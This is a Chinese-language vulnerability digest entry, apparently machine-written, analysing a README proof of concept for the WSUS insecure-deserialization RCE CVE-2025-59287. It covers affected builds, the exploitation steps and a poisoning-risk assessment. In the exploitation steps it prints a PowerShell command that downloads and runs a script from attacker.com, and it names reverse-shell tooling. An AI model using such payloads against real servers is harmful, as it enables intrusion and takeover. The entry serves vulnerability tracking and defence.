## CVE-2025-59287 - Microsoft Windows Server Update Services (WSUS) 远程代码执行 (RCE), 不安全的反序列化

**漏洞编号:** CVE-2025-59287

**漏洞类型:** 远程代码执行 (RCE), 不安全的反序列化

**影响应用:** Microsoft Windows Server Update Services (WSUS)

**危害等级:** 高危/关键

**CVSS评分:** 9.8

**影响版本:** Windows Server 2025 (10.0.26100.0 – < 10.0.26100.6905), Windows Server 2022 (10.0.20348.0 – < 10.0.20348.4297), Windows Server 2019 (10.0.17763.0 – < 10.0.17763.7922), Windows Server 2016 (10.0.14393.0 – < 10.0.14393.8524), Windows Server 2012 R2 (6.3.9600.0 – < 6.3.9600.22826), Windows Server 2012 (6.2.9200.0 – < 6.2.9200.25728), Windows Server 23H2 (10.0.25398.0 – < 10.0.25398.1916)

**利用条件:** 无需认证，仅需网络连接，攻击复杂度低

**POC 可用性:** 8

**POC 类型:** 概念验证 (Payload示例)

**攻击复杂度:** 低

**投毒风险:** 0%

## 详情

CVE-2025-59287是一个针对Microsoft Windows Server Update Services (WSUS)组件的远程代码执行(RCE)高危漏洞。所提供的POC代码是一份名为`README.md`的详细文档，它以清晰、结构化的方式阐述了该漏洞的本质、利用原理及影响。此POC并非一个可直接执行的脚本，而是一个概念验证的详细说明，但其有效性极高。
文档指出，漏洞根源在于WSUS服务在处理其内部机制，特别是`UpdateStream.xml`文件时，存在不安全的反序列化缺陷。WSUS使用`.NET`的`BinaryFormatter`或类似的机制（例如POC中提到的`System.Xml.Linq.XElement`）来反序列化不可信的数据。攻击者可以注入特制的XML内容到更新流中，特别是操纵`<SourcePath>`和`<Command>`元素。当WSUS服务尝试处理这个恶意构造的更新流时，它会将`<SourcePath>`指定的内容写入磁盘，并直接执行`<Command>`标签内的PowerShell命令，从而实现未经身份验证的远程代码执行。
这份POC的有效性体现在以下几个方面：
1.  **原理清晰**: 它明确指出了漏洞类型（不安全反序列化），受影响的组件（WSUS），以及触发点（处理`UpdateStream.xml`文件中的`<SourcePath>`和`<Command>`元素）。
2.  **攻击面具体**: 详细描述了攻击者如何通过构造恶意XML payload来达到RCE的目的，并提供了具体的XML结构示例。
3.  **无需认证**: POC强调攻击者无需任何身份凭证即可利用此漏洞，仅需网络连接，这与搜索结果中的“未经身份验证的远程攻击者”和“无需认证”信息一致，印证了其高危性。
4.  **影响范围明确**: 文档列举了受影响的Windows Server版本及具体的构建号，为防御者提供了精确的修补依据。
5.  **活跃利用警告**: POC提及该漏洞已在野外被积极利用，进一步强调了其紧迫性和实用价值。
虽然它不是一个一键式工具，但其详细的解释和可操作的XML载荷足以指导有一定技术背景的安全研究人员或攻击者构建自己的利用工具，因此在概念验证层面具有极高的有效性。

**利用步骤:**
CVE-2025-59287的利用过程主要围绕构造和传输恶意的XML更新流到WSUS服务。以下是典型的利用步骤：
1.  **目标识别与网络访问**: 攻击者首先需要识别网络中运行WSUS服务的Windows服务器，并确保能够通过网络访问到WSUS服务的相关端口（通常是8530/8531或80/443，取决于配置）。
2.  **构造恶意XML载荷**: 攻击者需要根据POC提供的结构，精心构造一个恶意的`UpdateStream.xml`文件。这个XML文件是实现远程代码执行的核心。其中最关键的两个元素是：
    *   `<SourcePath>`：攻击者在这里指定一个目标服务器上期望写入的任意文件路径。当WSUS服务处理时，会尝试将此路径下的内容（实际上是`<Command>`中的内容或者一个被引用的可执行文件）写入磁盘或作为执行上下文的一部分。
    *   `<Command>`：此标签内包含攻击者希望在目标WSUS服务器上以PowerShell命令形式执行的任意代码。POC中的示例是`powershell -NoProfile -ExecutionPolicy Bypass -File C:\Windows\System32\cmd.exe`，但这仅为演示。在实际攻击中，此处会替换为更具破坏性的PowerShell命令，例如下载并执行一个远程恶意脚本（如PowerCat用于获取反向Shell），或者执行系统管理命令、植入后门等。一个更实际的攻击载荷可能类似于`powershell.exe -c IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.com/malicious_script.ps1')`，如搜索结果3中所示。
3.  **发送恶意更新事件**: 攻击者需要找到一种方式将这个恶意的`UpdateStream.xml`内容或其引用，通过WSUS服务预期的通信机制发送过去。根据搜索结果和POC的描述，这可能涉及操纵WSUS处理`AuthorizationCookie`或通过发送特制的事件来触发传统序列化机制中不安全的对象反序列化，从而使得WSUS从攻击者控制的远程位置（或者直接注入内容）获取并处理这个恶意的更新流。由于漏洞无需认证，攻击者无需有效凭证即可进行此操作。
4.  **代码执行与控制**: 一旦WSUS服务成功接收并反序列化攻击者构造的恶意XML，`<Command>`标签中的PowerShell命令就会在WSUS服务运行的权限下被执行，通常是`NETWORK SERVICE`或`SYSTEM`权限。这使得攻击者可以在目标服务器上实现任意代码执行，进而完全控制受感染的系统。攻击者可以利用此权限进行数据窃取、横向移动、安装恶意软件或进行其他恶意活动。

**投毒风险分析:**
所分析的POC是一份Markdown格式的`README.md`文档，其核心内容是对CVE-2025-59287漏洞的详细技术说明、影响范围列表以及一个用于演示漏洞原理的XML有效载荷示例。基于对这份特定POC的审查，对其投毒风险评估如下：

1.  **代码混淆与恶意行为**: 该`README.md`文档是纯文本文件，其内容清晰、结构化，用于阐述漏洞的技术细节。文档中不包含任何可执行的混淆代码、二进制文件、或试图在用户本地环境执行任何操作的恶意脚本。其中提供的XML有效载荷是漏洞利用的关键部分，其目的是演示攻击者如何构造恶意数据以触发WSUS服务的RCE。这个XML载荷本身并非POC的“恶意代码”，而是攻击者利用漏洞时使用的“工具”或“数据”。它明确展示了如何让目标系统执行`powershell`命令，但这是一种概念性演示，而不是在POC加载或运行时自行执行的。因此，从POC代码本身的层面来看，不存在代码混淆或直接的恶意行为。

2.  **外部脚本或可疑请求**: `README.md`文件作为一个静态文档，不会主动发起任何网络请求，也不会尝试从外部加载任何脚本。它只是描述了漏洞的利用机制，其中包含的PowerShell命令示例（例如下载远程脚本）是攻击者在实际利用时会采用的手段，而非POC文档本身会执行的操作。这意味着该POC不会自动连接到外部恶意服务器，下载可疑内容，或进行任何未经授权的通信。它仅是提供了一个理论上的攻击载荷例子。

3.  **标准库使用**: Markdown文件作为文档格式，不涉及编程语言的标准库使用。因此，不存在通过滥用标准库功能来引入恶意行为的风险。

综上所述，这份特定的POC（即`README.md`文档）的投毒风险极低，可以评定为0%。它完全符合防御性安全研究的范畴，旨在通过清晰地解释漏洞原理和提供利用示例来帮助安全专业人员理解和防御此类攻击。用户在阅读和理解这份POC时，可以放心地认为它不会对本地系统构成威胁。然而，对于任何给出的利用示例（包括此POC中的XML载荷），安全研究人员在尝试复现漏洞时必须谨慎，确保在受控环境中进行，并且充分理解所执行命令的潜在影响，以避免意外的系统损害或安全事件。该POC的价值在于其教育性和指导性，而非其作为攻击工具的直接可用性或恶意性。

**项目地址:** Not available in input

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-59287
